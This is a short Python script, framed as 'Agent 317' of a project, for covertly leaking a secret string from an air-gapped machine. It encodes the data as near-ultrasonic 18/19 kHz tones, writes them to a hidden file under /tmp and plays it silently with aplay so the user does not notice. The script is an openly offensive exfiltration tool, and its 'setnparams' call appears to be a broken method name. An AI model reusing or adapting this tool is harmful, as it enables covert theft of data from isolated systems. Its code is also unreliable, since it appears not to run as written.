#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import time
import math
import wave
import array

class CovertAudioExfiltrator:
    """
    Agent 317: Air-Gap Ultrasonic Exfiltrator.
    Encodes data into near-ultrasonic frequencies (18kHz - 20kHz) 
    to transmit data to nearby listening devices without network access.
    """
    def __init__(self, data_string):
        self.data = data_string
        self.sample_rate = 44100
        self.frequency_map = {
            '0': 18000, # 18kHz for Bit 0
            '1': 19000  # 19kHz for Bit 1
        }

    def _generate_tone(self, freq, duration=0.1):
        """Generates a raw sine wave for a specific frequency."""
        num_samples = int(duration * self.sample_rate)
        samples = array.array('h')
        for i in range(num_samples):
            sample = int(32767 * math.sin(2 * math.pi * freq * i / self.sample_rate))
            samples.append(sample)
        return samples

    def transmit(self):
        print(f"--- [AGENT 317: ULTRASONIC EXFILTRATION START] ---")
        
        # Convert string to binary bits
        binary_data = ''.join(format(ord(i), '08b') for i in self.data)
        print(f"[*] Transmitting {len(binary_data)} bits via 18kHz/19kHz carrier...")

        # In a high-fidelity scenario, we would play this directly to the 
        # audio device. For this primitive, we generate a .wav file.
        output_file = "/tmp/.sys-audio-sync.wav"
        with wave.open(output_file, 'w') as w:
            w.setnparams((1, 2, self.sample_rate, 0, 'NONE', 'not compressed'))
            for bit in binary_data:
                freq = self.frequency_map[bit]
                tone = self._generate_tone(freq)
                w.writeframes(tone.tobytes())
        
        # Play the file using a standard system player (invisible to user)
        os.system(f"aplay {output_file} > /dev/null 2>&1")
        print("[!!!] TRANSMISSION COMPLETE. Air-gap bypassed.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py 'secret_data'")
        sys.exit(1)
    
    CovertAudioExfiltrator(sys.argv[1]).transmit()
